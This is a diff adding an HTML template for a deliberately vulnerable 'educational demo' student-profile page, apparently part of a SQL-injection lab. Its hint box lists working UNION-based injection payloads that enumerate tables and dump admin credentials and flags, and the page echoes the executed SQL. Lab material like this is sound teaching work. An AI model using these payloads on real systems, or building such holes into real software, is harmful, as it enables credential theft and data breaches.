@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Profile - IIT Jodhpur</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f7fa; min-height: 100vh; }
+        .header { background: #1a237e; color: #fff; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
+        .header h1 { font-size: 18px; }
+        .header a { color: #ffcc80; text-decoration: none; font-size: 13px; margin-left: 15px; }
+        .vuln-banner { background: #fff3e0; border-bottom: 2px solid #ff6f00; padding: 8px; font-size: 12px; color: #e65100; text-align: center; }
+        .container { max-width: 800px; margin: 30px auto; padding: 0 20px; }
+        .card { background: #fff; border-radius: 10px; padding: 30px; box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 20px; }
+        .card h2 { color: #1a237e; font-size: 20px; margin-bottom: 5px; }
+        .card .desc { color: #888; font-size: 13px; margin-bottom: 15px; }
+        .nav-links { margin-bottom: 20px; }
+        .nav-links a { display: inline-block; padding: 6px 12px; background: #e8eaf6; color: #1a237e; border-radius: 5px; font-size: 12px; text-decoration: none; margin-right: 5px; }
+        .nav-links a:hover { background: #c5cae9; }
+        .profile-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .profile-item { padding: 10px 15px; background: #f5f7fa; border-radius: 6px; }
+        .profile-item .label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }
+        .profile-item .value { font-size: 15px; color: #333; font-weight: 600; margin-top: 3px; }
+        .error-box { background: #fce4ec; color: #c62828; padding: 12px 15px; border-radius: 6px; font-size: 13px; border-left: 3px solid #c62828; margin-bottom: 15px; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 15px; }
+        th { background: #e8eaf6; color: #1a237e; padding: 10px 12px; text-align: left; }
+        td { padding: 10px 12px; border-bottom: 1px solid #f0f0f0; color: #444; }
+        .debug-box { background: #f5f5f5; border: 1px solid #e0e0e0; border-radius: 6px; padding: 12px; margin-top: 18px; }
+        .debug-box .label { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+        .debug-box code { font-family: 'Consolas', monospace; font-size: 11px; color: #c62828; word-break: break-all; }
+        .hint-box { background: #e3f2fd; border-left: 4px solid #1565c0; padding: 15px; border-radius: 4px; margin-top: 20px; }
+        .hint-box h4 { color: #1565c0; font-size: 13px; margin-bottom: 8px; }
+        .hint-box code { background: #e8eaf6; padding: 2px 6px; border-radius: 3px; font-size: 11px; color: #1a237e; }
+        .hint-box p { font-size: 12px; color: #555; line-height: 1.7; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="vuln-banner">&#9888; EDUCATIONAL DEMO — This page is vulnerable to UNION-based SQL Injection via the id parameter</div>
+
+<div class="header">
+    <h1>&#127891; IIT Jodhpur - Student Profile</h1>
+    <div>
+        <a href="/">Home</a>
+        <a href="/login">Login</a>
+        <a href="/search">Search</a>
+        <a href="/oob_demo">OOB Demo</a>
+    </div>
+</div>
+
+<div class="container">
+    <div class="card">
+        <h2>&#128100; Student Profile</h2>
+        <p class="desc">View student details by ID. The <code>id</code> URL parameter is vulnerable to UNION-based injection.</p>
+
+        <div class="nav-links">
+            <a href="/profile?id=1">Student 1</a>
+            <a href="/profile?id=2">Student 2</a>
+            <a href="/profile?id=3">Student 3</a>
+            <a href="/profile?id=4">Student 4</a>
+            <a href="/profile?id=5">Student 5</a>
+        </div>
+
+        {% if error %}
+        <div class="error-box">{{ error }}</div>
+        {% endif %}
+
+        {% if student %}
+        <div class="profile-grid">
+            <div class="profile-item"><div class="label">ID</div><div class="value">{{ student.id }}</div></div>
+            <div class="profile-item"><div class="label">Roll Number</div><div class="value">{{ student.roll_number }}</div></div>
+            <div class="profile-item"><div class="label">Name</div><div class="value">{{ student.name }}</div></div>
+            <div class="profile-item"><div class="label">Email</div><div class="value">{{ student.email }}</div></div>
+            <div class="profile-item"><div class="label">Department</div><div class="value">{{ student.department }}</div></div>
+            <div class="profile-item"><div class="label">Semester</div><div class="value">{{ student.semester }}</div></div>
+        </div>
+        {% endif %}
+
+        {% if raw_results and raw_results|length > 1 %}
+        <h3 style="color:#c62828; margin-top:20px; font-size:14px;">&#9888; UNION Injection Detected — {{ raw_results|length }} rows returned:</h3>
+        <table>
+            <tr><th>Col 1</th><th>Col 2</th><th>Col 3</th><th>Col 4</th><th>Col 5</th><th>Col 6</th></tr>
+            {% for row in raw_results %}
+            <tr>{% for cell in row %}<td>{{ cell }}</td>{% endfor %}</tr>
+            {% endfor %}
+        </table>
+        {% endif %}
+
+        {% if query %}
+        <div class="debug-box">
+            <div class="label">&#128270; SQL Query Executed</div>
+            <code>{{ query }}</code>
+        </div>
+        {% endif %}
+    </div>
+
+    <div class="hint-box">
+        <h4>&#128161; UNION-Based SQLi Demo Hints</h4>
+        <p><strong>Step 1 — Find column count:</strong> <code>/profile?id=1 ORDER BY 6--</code> (works) vs <code>ORDER BY 7--</code> (error = 6 columns)</p>
+        <p><strong>Step 2 — UNION extract tables:</strong> <code>/profile?id=0 UNION SELECT 1,name,type,sql,5,6 FROM sqlite_master--</code></p>
+        <p><strong>Step 3 — Dump admin creds:</strong> <code>/profile?id=0 UNION SELECT 1,username,password,role,secret_notes,6 FROM admin_users--</code></p>
+        <p><strong>Step 4 — Get the flag:</strong> <code>/profile?id=0 UNION SELECT 1,flag_name,flag_value,4,5,6 FROM secret_flags--</code></p>
+    </div>
+</div>
+
+</body>
+</html>
